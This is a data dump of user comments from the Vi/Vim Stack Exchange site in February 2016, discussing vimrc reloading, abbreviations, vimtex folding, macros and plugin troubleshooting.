  <row Id="10057" PostId="6377" Score="1" Text="And as soon as it encounters a character which makes you go into insert mode (`a`, `i`, `A`, `I`...), the rest of your vimrc file is inserted in your current buffer. So maybe try to remove the bang after the `:source` command to see if that solves your issue." CreationDate="2016-02-05T19:05:37.150" UserId="4939" />
  <row Id="10058" PostId="6377" Score="0" Text="Thank you @saginaw. It's a RTFM case I guess - following you comment I read the doc on `help source`. However, how can I reload vimrc and reload functions defined in it? I thought `source!` reloads functions (vim suggests doing that when I do `source`). If I modify my function in vimrc, how can I reload it - replace currently loaded one, I guess? That's the only reason why I was using `source!`. Thank you! I will write an answer to this question, one I clarify this (if no one beats me to it). Edit: I guess I can put all functions I write into another rc file and source it, but will that work?" CreationDate="2016-02-05T21:26:13.157" UserId="3006" />
  <row Id="10059" PostId="6377" Score="2" Text="I may be wrong but I think you have defined functions without putting a bang after the keyword `function`. If you don't put a bang after `function`, when you reload your vimrc, Vim will complain because you are trying to define a new function whose name is already taken by a previous version. To avoid this, you should always put a bang after every keyword `function` in your vimrc: `function! MyFunction()` This way the new version will overwrite the older one." CreationDate="2016-02-05T21:36:55.117" UserId="4939" />
  <row Id="10060" PostId="6377" Score="1" Text="Alright, I think following @saginaw advice I can do the following: both `command` and `function` declarations have a bang attribute `!`, which I can put after `function! Foo()` or `command! Foo`. When vimrc is sourced, it will source the function. If there is not bang attribute, then it will not." CreationDate="2016-02-05T21:37:06.643" UserId="3006" />
  <row Id="10061" PostId="6377" Score="1" Text="Great! I posted this at the same time literally. :) I will write an answer then. Thank you!" CreationDate="2016-02-05T21:37:51.603" UserId="3006" />
  <row Id="10062" PostId="3753" Score="0" Text="I never would have figured this out in a million years. Thank you!" CreationDate="2016-02-05T22:32:33.563" UserId="6315" />
  <row Id="10063" PostId="6365" Score="1" Text="I did not test this, but I suspect that the problem would be the same --- if I say `let g:UltiSnipsSnippetDirectories=[&quot;UltiSnips&quot;, &quot;.&quot;]` it doesn't work, and I should put the full path always... mmhhh. Maybe time for a feature request." CreationDate="2016-02-06T08:50:19.673" UserId="854" />
  <row Id="10064" PostId="6388" Score="1" Text="@muru: thanks a ton! This is so easy...and I was heard of that...but never used it before..." CreationDate="2016-02-06T10:22:31.357" UserId="5912" />
  <row Id="10065" PostId="6389" Score="1" Text="Thanks for the explanation...now i understand where i was doing wrong...as i am already mentioned a very new to `vim` but very fond of it... i was regular user of &quot;epsilon&quot; (a emacs style editor), but i never have use before such a great editor like VIM...thanks again for your kind assistance..." CreationDate="2016-02-06T10:42:00.800" UserId="5912" />
  <row Id="10066" PostId="6388" Score="0" Text="*both the ways are failed* is incorrect grammatically - it should be either  *both ways have failed*, or just *both ways failed*." CreationDate="2016-02-06T10:45:15.777" UserId="205" />
  <row Id="10067" PostId="6388" Score="1" Text="@muru: perhaps....you're right..." CreationDate="2016-02-06T10:48:41.487" UserId="5912" />
  <row Id="10068" PostId="6365" Score="1" Text="You can get the full path with `expand()` or `fnamemodify()`. I do this all the time with my template expander plugin -- mu-template. But as with my other plugins, it supports project/buffer local settings." CreationDate="2016-02-06T10:51:24.320" UserId="626" />
  <row Id="10069" PostId="6386" Score="1" Text="I'm not sure if what you saw in other editors isn't something actually unrelated with `set list`, but instead something which has to do with *showing trailing tabs or spaces*, or *showing mix of tabs and spaces*. This, Vim can do, by using for example something like: https://github.com/tpope/vim-sleuth/issues/13#issuecomment-50433307 (there are many solutions). Such rules may have the secondary effect that, in insert mode, if you type a tab or a space, you will see it highlighted/displayed differently, until you type some other character." CreationDate="2016-02-06T11:59:10.613" UserId="1800" />
  <row Id="10071" PostId="6391" Score="0" Text="Does the following code produce what you want? http://vpaste.net/IfU1j" CreationDate="2016-02-06T18:27:48.550" UserId="4939" />
  <row Id="10072" PostId="6391" Score="0" Text="@saginaw Yeah, brilliant -- post that as an answer and it's yours." CreationDate="2016-02-06T18:43:30.427" UserId="4913" />
  <row Id="10073" PostId="6392" Score="1" Text="The &quot;simpler way&quot; didn't work out in this case because I think of robustness; the actual suffix is `[7:0]` and you would have to play around with the number of `b`s, etc. to customize for that, I think." CreationDate="2016-02-06T19:11:26.530" UserId="4913" />
  <row Id="10074" PostId="6392" Score="0" Text="@delicateLatticeworkFever You are right, I didn't think about that. In this particular case, maybe replacing `b` and `e` with `B` and `E` would be enough. But there may be other cases where it would fail, I don't know. In any case the first version should, hopefully, work most of the time." CreationDate="2016-02-06T19:21:48.127" UserId="4939" />
  <row Id="10075" PostId="6393" Score="0" Text="Use `\zs` and `\ze`.  See `:help \zs`." CreationDate="2016-02-06T20:32:04.697" UserId="865" />
  <row Id="10076" PostId="6390" Score="4" Text="Vimscript is nothing more than series of ex commands so your functions are interpreted just like any ex commands. No compilation or transcoding necessary." CreationDate="2016-02-06T20:56:56.277" UserId="54" />
  <row Id="10077" PostId="3626" Score="0" Text="Instead of ` ` (before `\+$`), use `\s`, so any kind of trailing whitespace would be removed, notably `tab`. (Congratulations to SE for making it impossible to make monospaced what's inside this quotation: `' \s\+$'`)" CreationDate="2016-02-06T23:22:46.270" UserId="850" />
  <row Id="10079" PostId="6397" Score="0" Text="You misread the question.  I want the end result to be something like: `X(FOOBAR)` not `X( FOOBAR`.  Using Ctrl-] just eliminates the space *at the end*.  I need to be able to use the abbreviation -- *which also depends on whitespace at the beginning to fire* -- but have it concatenated with the *previous* word (that's what a &quot;**suffix**&quot; means)." CreationDate="2016-02-07T11:17:45.707" UserId="4913" />
  <row Id="10080" PostId="6401" Score="0" Text="Awesome.  I did read `help mapleader` but did not get the meaning.  All my bindings are &lt;Fn&gt; and &lt;M-Fn&gt; (and those are used up...) so this should come in handy all kinds of ways." CreationDate="2016-02-07T16:10:41.413" UserId="4913" />
  <row Id="10081" PostId="6366" Score="2" Text="You might be able to highlight them a certain color, but there isn't any way of showing them as specific characters that isn't hacky afaik." CreationDate="2016-02-07T19:00:11.507" UserId="865" />
  <row Id="10082" PostId="6397" Score="0" Text="Oh, you want a snippet plugin..." CreationDate="2016-02-07T19:22:22.070" UserId="71" />
  <row Id="10084" PostId="6384" Score="1" Text="Interesting. Well, it looks MUCH better now." CreationDate="2016-02-07T19:32:22.563" UserId="2010" />
  <row Id="10085" PostId="6397" Score="0" Text="I guess this could be done with something defined `${1}FOOBAR` -- that's a good answer.  If you want to change this :/ or add another answer I'll tick that." CreationDate="2016-02-07T19:32:48.530" UserId="4913" />
  <row Id="10087" PostId="6397" Score="0" Text="since i personally don't know snippet plugins, I can't seriously make this an answer." CreationDate="2016-02-07T20:27:13.770" UserId="71" />
  <row Id="10088" PostId="6392" Score="0" Text="@delicateLatticeworkFever Rereading my answer I realize that it's overly complex. Probably something like `iab fo &lt;BS&gt;foobar` was enough. Sorry for the inconvenience, you should probably tick the answer of @djjcast as the correct answer. At the moment I can't remove my answer, but once I can I will. Again really sorry, I'm not used to abbreviations." CreationDate="2016-02-07T20:51:35.697" UserId="4939" />
  <row Id="10089" PostId="6392" Score="0" Text="Hey `&lt;BS&gt;` was just the thing.  I swear tried something like that, but I don't know all the control characters, so I might have used `&lt;backspace&gt;` or something." CreationDate="2016-02-07T20:53:53.127" UserId="4913" />
  <row Id="10090" PostId="6392" Score="0" Text="Christian Brabandt had a good suggestion too about using snippets (did not stop to think you could place the parameter in front...) -- maybe I will put both those into a simple alternative answer." CreationDate="2016-02-07T20:55:56.500" UserId="4913" />
  <row Id="10091" PostId="6392" Score="1" Text="@delicateLatticeworkFever I understand, no problem. If you want to see all the special key names, you can read them here: `:help key-notation`" CreationDate="2016-02-07T20:56:42.853" UserId="4939" />
  <row Id="10093" PostId="6330" Score="0" Text="I think the answer to this is &quot;no&quot;. At least, I have not figured out any way to do it." CreationDate="2016-02-08T07:29:49.497" UserId="21" />
  <row Id="10094" PostId="6403" Score="4" Text="See also &quot;:help keycodes&quot;." CreationDate="2016-02-08T10:36:50.257" UserId="4913" />
  <row Id="10095" PostId="6406" Score="6" Text="If you provide a list of `spellfile`s, `zg` takes a count to decide which spellfile to add to." CreationDate="2016-02-08T20:22:33.413" UserId="205" />
  <row Id="10096" PostId="6410" Score="3" Text="Your autocmd depends on vim being in the directory holding myProject; there are several options that could affect that.  What does :echo g:netrw_keepdir show and what does :echo &amp;acd show, for example.  After navigating, what does :echo getcwd() show?" CreationDate="2016-02-08T21:44:02.047" UserId="2377" />
  <row Id="10097" PostId="6409" Score="0" Text="You could try using a filename-modifier like `:r` or a combination of several like `:t:r`. `:t` should allow you to get the tail of the path, that is just the last element in the path (`baz` in `/foo/bar/baz`). And `:r` the root of the path, the path without the extension of the last item (`/foo/bar/baz` in `/foo/bar/baz.c`). So you could try: `!pdflatex % &amp;&amp; start %:r.pdf` or `!pdflatex % &amp;&amp; start %:t:r.pdf`" CreationDate="2016-02-08T21:45:04.130" UserId="4939" />
  <row Id="10098" PostId="6409" Score="0" Text="@saginaw You should post that as an answer." CreationDate="2016-02-08T22:04:54.893" UserId="21" />
  <row Id="10099" PostId="6409" Score="2" Text="@electriccello You might be interested in my LaTeX plugin [vimtex](https://github.com/lervag/vimtex). It provides a mapping (default `\ll`) that starts [latexmk](https://www.ctan.org/pkg/latexmk/) in continuous compilation mode, which IMHO is a very convenient way of working with LaTeX documents." CreationDate="2016-02-08T22:06:47.960" UserId="21" />
  <row Id="10100" PostId="6411" Score="3" Text="[vimtex](https://github.com/lervag/vimtex) provides a reasonably nice folding function that provides folding for commented out lines (with `let g:vimtex_fold_comments = 1`. It does not provide the folding between occurences of `\somecommand`, but I don't really understand why you would want that." CreationDate="2016-02-08T22:09:14.480" UserId="21" />
  <row Id="10101" PostId="6411" Score="0" Text="Because my document consists of parts preceeded by a \comment macro. Thanks." CreationDate="2016-02-08T22:43:01.957" UserId="4505" />
  <row Id="10102" PostId="6411" Score="1" Text="@KarlYngveLervåg, % fakesection does the job. Is there a way to refresh the folds without exiting and reopening?" CreationDate="2016-02-08T23:17:27.507" UserId="4505" />
  <row Id="10103" PostId="6410" Score="1" Text="@user21497 ah, thanks, your comment helped me realize the issue. I needed to use `*/myProject/frontEnd/**` as my path. If you convert your comment to an answer I'll mark it as accepted." CreationDate="2016-02-09T00:13:24.183" UserId="2312" />
  <row Id="10104" PostId="5036" Score="1" Text="yes. [some examples here](http://stackoverflow.com/questions/7325052/can-someone-explain-to-me-why-the-dot-command-is-so-useful-in-vim)" CreationDate="2016-02-09T01:10:31.813" UserId="398" />
  <row Id="10105" PostId="5045" Score="1" Text="Concur with @Wildcard, drove me crazy watching my colleague trying to parse fixed-width data by **counting keypresses**, took him a couple of weeks, my help was declined. Sigh" CreationDate="2016-02-09T01:15:02.593" UserId="398" />
  <row Id="10106" PostId="2388" Score="0" Text="And on windows it tends to be: &quot;C:\Users\&lt;username&gt;\_viminfo&quot;" CreationDate="2016-02-09T04:23:11.160" UserId="2568" />
  <row Id="10107" PostId="6394" Score="0" Text="Huh, I thought when using `{curly braces}` you have to backslash escape both of them, e.g. `/\(cat\)\{3\}/` to match `catcatcat`.  Is `\{-}` a typo?" CreationDate="2016-02-09T05:39:33.307" UserId="4676" />
  <row Id="10108" PostId="6394" Score="0" Text="Also: Thanks, I didn't know about the &quot;minimal match&quot; quantifier; I usually would just use `:s/'\([^']*\)'/$(\1)/g`" CreationDate="2016-02-09T05:40:37.047" UserId="4676" />
  <row Id="10109" PostId="6393" Score="0" Text="I'm certain that `\&amp;` doesn't do what you think it does...although I don't know exactly *what* you think it does.  :)" CreationDate="2016-02-09T05:46:10.423" UserId="4676" />
  <row Id="10110" PostId="6394" Score="1" Text="No, only the first `{` needs to be escaped." CreationDate="2016-02-09T06:12:07.863" UserId="54" />
  <row Id="10111" PostId="6346" Score="0" Text="@DavidOneill I think there may be some possible options in the case: 1. Open all of them. 2. Open anyone with notice message. 3. Ask the user to choose one." CreationDate="2016-02-09T08:03:15.373" UserId="6261" />
  <row Id="10112" PostId="6415" Score="2" Text="You should probably map to some other key instead of `&lt;cr&gt;` (maybe `x`?) , and `vimfiler#set_execute_file` appends to this dictionary, so perhaps the function call is more appropriate." CreationDate="2016-02-09T08:35:45.880" UserId="205" />
  <row Id="10113" PostId="6415" Score="0" Text="@muru You are right, the call to the function is a better solution as it appends to the dictionary instead of overwriting it. I also changed the key to `x`." CreationDate="2016-02-09T08:51:08.117" UserId="4939" />
  <row Id="10114" PostId="6415" Score="0" Text="@muru Sorry I deleted it because I found yours much simpler and more efficient. I didn't realize there was already a built-in mapping for what the author of the question wanted. I've undeleted it now." CreationDate="2016-02-09T09:23:21.757" UserId="4939" />
  <row Id="10115" PostId="6415" Score="1" Text="Well, `vimfiler_execute_system_associated` serves a different purpose. With `vimfiler_associated` (which is what OP and you are interested in), you don't have to change settings which might affect other programs - the association is purely within Vim. With `system_associated`, a change in association affects other programs as well (and has to be done outside Vim)." CreationDate="2016-02-09T09:25:12.777" UserId="205" />
  <row Id="10116" PostId="6416" Score="0" Text="Wow! `x` worked! It worked even without the mapping you suggested. Thanks so much!" CreationDate="2016-02-09T10:42:55.187" UserId="6349" />
  <row Id="10117" PostId="6418" Score="0" Text="Sorry, what's your actual question?" CreationDate="2016-02-09T12:04:22.510" UserId="4932" />
  <row Id="10118" PostId="6418" Score="0" Text="What do you think? Obviously the implicit q. is: can this be remedied. (Pretend I used a quæstion mark if it helps you.)" CreationDate="2016-02-09T12:09:40.143" UserId="4505" />
  <row Id="10119" PostId="6418" Score="0" Text="Do you want manual and persistent folds? Or do you want to speed up vimtex? These are two different questions..." CreationDate="2016-02-09T12:19:40.107" UserId="51" />
  <row Id="10120" PostId="6418" Score="1" Text="I like fold markers" CreationDate="2016-02-09T12:22:43.033" UserId="4655" />
  <row Id="10121" PostId="6418" Score="0" Text="@Carpetsmoker, I would prefer to speed up, but if that is not possible, I would like persistent manual folds. sorry I didn't know asking two related qq. in one was a problem." CreationDate="2016-02-09T12:22:52.497" UserId="4505" />
  <row Id="10122" PostId="6418" Score="2" Text="You can save folds over sessions with `mkview` and `loadview`. See [Can I save folds?](http://vi.stackexchange.com/questions/5488/can-i-save-folds)" CreationDate="2016-02-09T12:25:13.630" UserId="4655" />
  <row Id="10123" PostId="6418" Score="1" Text="Okay; I edited your question to only include the vimtex question. For the other one see: [Can I save folds?](http://vi.stackexchange.com/q/5488/51)" CreationDate="2016-02-09T12:31:39.643" UserId="51" />
  <row Id="10124" PostId="6418" Score="0" Text="For marker folding I have the following lines in my `ftplugin/tex.vim`:  `setlocal foldmethod=marker`, `setlocal foldmarker=(fold),(end)` and `setlocal commentstring=\ %\ %s`.&#xA;In addition to this I use snippets which all have `% (fold)`,`% (end)` pairs" CreationDate="2016-02-09T13:53:52.000" UserId="4655" />
  <row Id="10125" PostId="6418" Score="0" Text="@Steve, excellent, I've already started using markers. thanks for the commentstring tip! is there any objective advantege to (fold) over {{{ ?" CreationDate="2016-02-09T14:09:03.037" UserId="4505" />
  <row Id="10126" PostId="6409" Score="0" Text="I think the linked answer is better, but a quick modification to your current code is `start $(basename % .tex).pdf`" CreationDate="2016-02-09T14:13:16.510" UserId="4655" />
  <row Id="10127" PostId="6418" Score="0" Text="I think the default snippets file came with `% (fold/end)` and I got used to it, so I now prefer how it looks. Think that's about it afaik" CreationDate="2016-02-09T14:15:42.133" UserId="4655" />
  <row Id="10131" PostId="6423" Score="1" Text="This question is closely related to [this](https://vi.stackexchange.com/questions/2047/what-are-the-differences-between-latex-plugins), which has some potential useful answers, for instance [my answer](http://vi.stackexchange.com/a/5747/21) about [vimtex](https://github.com/lervag/vimtex)." CreationDate="2016-02-09T20:24:27.793" UserId="21" />
  <row Id="10132" PostId="6423" Score="0" Text="Thanks Karl. It was helpful and now I know about one more possible plug in I can try. May be I have compare their features to arrive at the answer I am looking for." CreationDate="2016-02-09T20:32:26.733" UserId="6356" />
  <row Id="10133" PostId="6424" Score="0" Text="sorry, I saw it but didn't understand it. I still have two problems with the package, though (for which thanks): first, that it doesn't show the number of lines in a fold, which I find useful; and secondly that using it it takes quite long to load a file. for these reasons I'll stick to markers, which I discovered today." CreationDate="2016-02-09T20:54:31.097" UserId="4505" />
  <row Id="10136" PostId="6427" Score="0" Text="Thanks for the detailed answer. ( please blog this :)" CreationDate="2016-02-10T05:40:45.027" UserId="6362" />
  <row Id="10137" PostId="6427" Score="2" Text="The location list can be used to advance over search matches in a macro, as long as the macro doesn't change the position of the matches, e.g. `:lv /\%3l\d/g %&lt;CR&gt;qqqqq&lt;C-a&gt;:lne&lt;CR&gt;@qq@q` will increment all numbers on line 3. Maybe there's a way to make this solution less fragile?" CreationDate="2016-02-10T07:45:11.400" UserId="6206" />
  <row Id="10138" PostId="6427" Score="0" Text="@djjcast You could post it as an answer, I've tried it and it works really great. There is just one case I don't understand, when I execute the macro on the following line `1 2 3 4 5 6 7 8 9 10`, I get `2 3 4 5 6 7 8 9 10 12` instead of `2 3 4 5 6 7 8 9 10 11`. I don't know why, maybe I mistyped something. Anyway it seems more sophisticated than my simple approach, and it involves regexes to describe where the macro should move the cursor, as well as a location list which I have never seen used in this way. I like it a lot!" CreationDate="2016-02-10T08:07:55.927" UserId="4939" />
  <row Id="10139" PostId="6427" Score="0" Text="@djjcast Sorry, I've just understood, the problem came simply from my regex, I should have used `\d\+` to describe multiple digits numbers." CreationDate="2016-02-10T08:19:23.457" UserId="4939" />
  <row Id="10140" PostId="6424" Score="0" Text="You can use standard `foldtext` with `set foldtext=`, which should show line numbers. Also, I personally don't have any problems with long load times that I've noticed. You could consider to open an issue and explain the problem and how to reproduce." CreationDate="2016-02-10T08:29:08.603" UserId="21" />
  <row Id="10141" PostId="6427" Score="0" Text="@djjcast Ah now I understand what you meant when you said the macro should not change the position of the matches. But I don't know how to solve this issue. The only idea I have would be to update the location list from inside the macro but I'm not used to the location list, it's too complex for me, really sorry." CreationDate="2016-02-10T10:16:38.257" UserId="4939" />
  <row Id="10142" PostId="2942" Score="0" Text="Turns out what I needed in my case was `hi VertSplit cterm=NONE` because it's `reverse` as a default." CreationDate="2016-02-10T10:57:16.230" UserId="6364" />
  <row Id="10143" PostId="6430" Score="4" Text="I think you approach the problem at the wrong level. If you need identical lines, you are already doing it wrong. Consider using a format (TeX, Markdown) that can *include* another files, or use ... links to the same external document. IMHO. Hyper-text :)" CreationDate="2016-02-10T12:19:30.930" UserId="1800" />
  <row Id="10144" PostId="6430" Score="0" Text="You could definitely do this without vim, using sed/awk/grep and inotifywait in a script." CreationDate="2016-02-10T12:31:40.383" UserId="4932" />
  <row Id="10145" PostId="6430" Score="0" Text="@VanLaser, what about a text where the same formula is discussed several times; you would want it to be visible each time." CreationDate="2016-02-10T12:35:18.673" UserId="4505" />
  <row Id="10146" PostId="6430" Score="0" Text="Open a different buffer, that shows the formula? And just reference it multiple times in your text?" CreationDate="2016-02-10T13:01:10.637" UserId="1800" />
  <row Id="10147" PostId="6430" Score="0" Text="@VanLaser, yes, I think you are right." CreationDate="2016-02-10T13:02:12.933" UserId="4505" />
  <row Id="10148" PostId="6430" Score="1" Text="That being said, I think it would be doable if you have some start-end special comment markers, and a `BufWrite` (?) event to sync all regions to the one where the cursor is." CreationDate="2016-02-10T13:06:01.723" UserId="1800" />
  <row Id="10149" PostId="6430" Score="0" Text="(.. or better, where the last changes happened, in such a region). This could get hairy - it would be easier if you would have an &quot;original region&quot; and &quot;copies - other regions - that must be kept in sync&quot;, so that you won't edit the copies, only the original region (which automatically updates the copies). But this would need 2 sets of delimiters." CreationDate="2016-02-10T13:13:33.177" UserId="1800" />
  <row Id="10150" PostId="6427" Score="1" Text="@saginaw Iterating over the matches in reverse order seems like it would resolve the issue in most cases since it seems like it's less likely for a macro to change the positions of previous matches. So after the `:lv ...` command, the `:lla` command can be used to jump to the last match and the `:lp` command can be used to advance over the matches in reverse order." CreationDate="2016-02-10T14:03:20.220" UserId="6206" />
  <row Id="10151" PostId="6422" Score="0" Text="Sated my curiosity. Great answer!" CreationDate="2016-02-10T14:32:58.460" UserId="1855" />
  <row Id="10154" PostId="5997" Score="0" Text="Great answer! I remapped it to `mm`, and using a recursive mapping it works as expected with plugins like *Vim-Signature*.&#xA;`nmap &lt;expr&gt; mm &lt;SID&gt;#IncrementalMark()`" CreationDate="2016-02-10T16:47:21.597" UserId="5707" />
  <row Id="10155" PostId="5996" Score="0" Text="Thank you! I liked the usage of `nr2char`." CreationDate="2016-02-10T16:49:21.227" UserId="5707" />
  <row Id="10156" PostId="6427" Score="0" Text="@djjcast You are right, I've just tried with a different macro and your solution works perfectly. I replaced the third line `1 2 3 4` with the text `one two three four`. Then typed `:lv /\%3l\w\+/g %` to populate the location list. `:lla` to move on the last entry. `qqq` to clear the register. `qq` to begin the recording. `ea-digits&lt;esc&gt;` to insert the suffix `-digits` at the end of the word and go back to normal mode. `:lp` to move to the previous entry. `@qq` to recall the macro and end the recording. And `@q` to replay the macro. It correctly added the suffix to all the words on the line." CreationDate="2016-02-11T02:42:13.850" UserId="4939" />
  <row Id="10157" PostId="353" Score="1" Text="Typing straight `:edit %:p:h` also seems to work." CreationDate="2016-02-11T08:13:16.580" UserId="6374" />
  <row Id="10158" PostId="6432" Score="4" Text="C-xC-f always uses the current buffer's working directory, without any options to configure it (it doesn't support `path` either). It depends on what your intended use for vim-rooter is. Depending on what you want from it, we could use other plugins. Aside: I use youcompleteme, which completes paths from the directory of the current buffer if you start typing `./`. See https://www.reddit.com/r/vim/comments/216jdd/youcompleteme_and_path_completion/" CreationDate="2016-02-11T09:25:01.007" UserId="205" />
  <row Id="10159" PostId="5931" Score="0" Text="Thanks for that, @garyjohn.&#xA;&#xA;I wound up adding the following function to my vimrc to help prepare text for pasting into a web form or word processor:&#xA;func! PastePrepare()&#xA;&gt;	setlocal fo-=a&#xA;&gt;	execute &quot;normal vipJ&quot;&#xA;&gt; endfu&#xA;&gt; com! PP call PastePrepare()" CreationDate="2016-02-11T12:03:28.707" UserId="5772" />
  <row Id="10160" PostId="6436" Score="0" Text="One question per post, please. Either split up your post, or ask how to apply your general settings to netrw/NerdTree buffers." CreationDate="2016-02-11T13:55:59.907" UserId="205" />
  <row Id="10161" PostId="6436" Score="0" Text="@muru: those are very similar and perhaps...would guide me to the same same direction..." CreationDate="2016-02-11T13:59:45.890" UserId="5912" />
  <row Id="10162" PostId="6436" Score="0" Text="Exactly. So why post as if these are two wildly differing things?" CreationDate="2016-02-11T14:01:19.247" UserId="205" />
  <row Id="10163" PostId="6436" Score="0" Text="@muru: perhaps not...may be the questions are divided into...but it also ends up with one conclusion...as those are `slightly different` in nature and that is why those are split likewise..." CreationDate="2016-02-11T14:03:13.930" UserId="5912" />
  <row Id="10164" PostId="6436" Score="0" Text="yet your title is combined." CreationDate="2016-02-11T14:05:57.343" UserId="205" />
  <row Id="10165" PostId="6440" Score="0" Text="Thanks for showing me the light...now i can understand...how to use `au`...and how implement as well...." CreationDate="2016-02-11T19:00:24.133" UserId="5912" />
  <row Id="10166" PostId="6440" Score="0" Text="@Cylian Glad I could help :)" CreationDate="2016-02-11T19:06:03.437" UserId="1405" />
  <row Id="10167" PostId="6442" Score="3" Text="clang-format has a googlestyle setting. I believe there is a plugin that you can use to run it from vim." CreationDate="2016-02-11T20:38:36.760" UserId="46" />
  <row Id="10168" PostId="6442" Score="0" Text="@FDinoff, awesome it works, if you answer, I will select it as solution..." CreationDate="2016-02-11T22:19:05.827" UserId="3050" />
  <row Id="10169" PostId="6446" Score="1" Text="What's in your .vimrc? And what problems do you have with building youcompleteme? Installing vim-youcomplete via package has been asked previously, here:  http://askubuntu.com/questions/541737/how-to-use-vim-youcompleteme" CreationDate="2016-02-12T02:40:54.197" UserId="4932" />
  <row Id="10170" PostId="6446" Score="0" Text="The installation was good. But when I open vi, it jumps out many errs, all about `youcompleteme#enable()`" CreationDate="2016-02-12T02:52:17.660" UserId="6380" />
  <row Id="10172" PostId="6431" Score="0" Text="Hmm -- `g:netrw_scp_cmd` isn't set. Tried the full scp path (/bin/scp) but it simply tried to open a new file on my local system (as it did with scp alone)" CreationDate="2016-02-12T03:31:35.033" UserId="4890" />
  <row Id="10173" PostId="6446" Score="0" Text="You will need to copy and paste the *full* error message you get. Without it, no one can give you any meaningful information. Don't put it in the comments, you can edit your question." CreationDate="2016-02-12T03:52:00.247" UserId="51" />
  <row Id="10174" PostId="6442" Score="0" Text="I don't understand (1)--they both have four spaces before the first `/`, right?" CreationDate="2016-02-12T04:52:35.317" UserId="1060" />
  <row Id="10175" PostId="6442" Score="0" Text="@KyleStrand: I believe (1) has to do with *not* indenting that line to match the other two comments (i.e. OP is specifying an edge case that should not change)." CreationDate="2016-02-12T05:02:03.447" UserId="920" />
  <row Id="10176" PostId="6442" Score="0" Text="@Kevin Ah, I thought it was saying it should be at the same indent-level as something on the previous or next line, but that makes sense. Thanks." CreationDate="2016-02-12T05:05:42.297" UserId="1060" />
  <row Id="10180" PostId="6446" Score="1" Text="Please add the information to the question. The info is crucial for anyone to answer the question, and thus you should not simply link to pastebins. If you want people to take the time to help you, then the least you can do is take the time to both formulate and formate your question to make it easy for people to understand what your problem is." CreationDate="2016-02-12T06:50:27.423" UserId="21" />
  <row Id="10181" PostId="6446" Score="1" Text="@KarlYngveLervåg Thanks for the advice" CreationDate="2016-02-12T06:57:59.570" UserId="6380" />
  <row Id="10182" PostId="6446" Score="1" Text="Please show `:version` output" CreationDate="2016-02-12T08:25:27.093" UserId="71" />
  <row Id="10183" PostId="6446" Score="2" Text="If you used apt, you are on a Debian based distribution. Which means `/usr/local/lib/python2.7` is python built from source. That can lead to any number of python problems. Why do you have it?" CreationDate="2016-02-12T10:07:40.090" UserId="205" />
  <row Id="10184" PostId="6446" Score="0" Text="@muru Can I redirect it so that it uses library from `/usr/lib/python2.7/config-x86_64-linux-gnu/libpython2.7.so`?" CreationDate="2016-02-12T10:09:18.950" UserId="6380" />
  <row Id="10185" PostId="6290" Score="1" Text="@ablewasiereisawelba I'm glad you found the &quot;Edit&quot; useful! As this was your first post here maybe you are unaware of how StackExchange notifications works: when you post a comment, the author of the answer/questions receives a notification; other persons will receive a notification only if you include the @&lt;nick&gt;. Thus only Rich received notifications about your last messages." CreationDate="2016-02-12T10:12:06.507" UserId="1405" />
  <row Id="10186" PostId="6446" Score="0" Text="@Chromium telling it to use `/usr/bin/python` instead of `/usr/local/bin/python` is one way. But why do you have it? It will only cause more pain going forward. If you want a newer Python version, use the deadsnakes PPA, or use virualenvs" CreationDate="2016-02-12T10:12:46.273" UserId="205" />
  <row Id="10187" PostId="6445" Score="0" Text="Thank you for that suggestion. Perhaps I will go down that route. Preferably, though, I'd like something that would let me focus more on the text and have to do less formatting (minimal though this is; I'll concede that)." CreationDate="2016-02-12T10:27:48.253" UserId="5772" />
  <row Id="10188" PostId="6446" Score="0" Text="@muru So where is the problem located? Is my python build (some people say that in their builds), or is there something wrong with my dependencies?" CreationDate="2016-02-12T10:36:18.943" UserId="6380" />
  <row Id="10189" PostId="6446" Score="1" Text="@Chromium if YCM had some python dependencies, then installing using apt will install those - for the system python. The locally installed python would be unaware of these, and you'll have to install them separately for the local python as well, using pip, perhaps." CreationDate="2016-02-12T11:39:09.007" UserId="205" />
  <row Id="10190" PostId="6443" Score="0" Text="Thanks. Maybe it's worth mentioning that it's actually not the fault of `vimtex` neither. Most of the syntax definitions come with `vim` and are located at `/usr/share/vim/vim74/syntax/` (at least for ubuntu)" CreationDate="2016-02-12T11:48:07.637" UserId="6379" />
  <row Id="10191" PostId="6449" Score="1" Text="show the output of :version please" CreationDate="2016-02-12T11:56:37.417" UserId="71" />
  <row Id="10192" PostId="6449" Score="1" Text="I have updated question body with :version output" CreationDate="2016-02-12T12:14:19.337" UserId="6399" />
  <row Id="10193" PostId="6449" Score="6" Text="Lookg at the version output. **-syntax**, **-eval** This means, syntax highlighting is **not** enabled in your vim build and plugins won't work. You need to get at least a normal build (you have a small version)" CreationDate="2016-02-12T12:29:21.867" UserId="71" />
  <row Id="10194" PostId="6443" Score="0" Text="I think it is implied in the answer. I have already updated vimtex so that it fixes the spell checking for the `\includepdf` command." CreationDate="2016-02-12T13:54:50.810" UserId="21" />
  <row Id="10195" PostId="6446" Score="0" Text="@muru install what separately? and I don't even know there is another python installation." CreationDate="2016-02-12T14:15:09.043" UserId="6380" />
  <row Id="10196" PostId="6446" Score="0" Text="Whichever python dependencies YCM may have." CreationDate="2016-02-12T14:15:37.570" UserId="205" />
  <row Id="10199" PostId="6453" Score="0" Text="yy isn't working for me. I can see on the cheatsheet I've printed out from www.vimcheatsheet.com that this is a very standard command. vim --version returns this: http://pastebin.com/DcFxZh1S. I'll have to investigate why it's not working for me... (I've tried in visual command and insert modes). Also when I paste, it all appears on the same line. However I've tried out g Ctrl-a and it does exactly what I wanted, thank you :)" CreationDate="2016-02-12T16:52:24.047" UserId="6402" />
  <row Id="10200" PostId="6453" Score="1" Text="`:verbose map y` should show you what mappings that start with `y` you have, and where they were set. But you have to use `yy` in normal mode." CreationDate="2016-02-12T16:55:40.423" UserId="1800" />
  <row Id="10201" PostId="6453" Score="0" Text="That returns: n y&lt;C-G&gt;      *@:call setreg(v:register, &lt;SNR&gt;35_recall())&lt;CR&gt;&#xA;        Last set from ~/.vim/bundle/vim-fugitive/plugin/fugitive.vim I'm not using fugitive yet so I'll remove it" CreationDate="2016-02-12T16:56:55.447" UserId="6402" />
  <row Id="10202" PostId="6453" Score="0" Text="That is OK (no custom `yy`). But make sure you are in normal mode (that's why I put an `Esc` at the end of item 1)" CreationDate="2016-02-12T16:58:09.833" UserId="1800" />
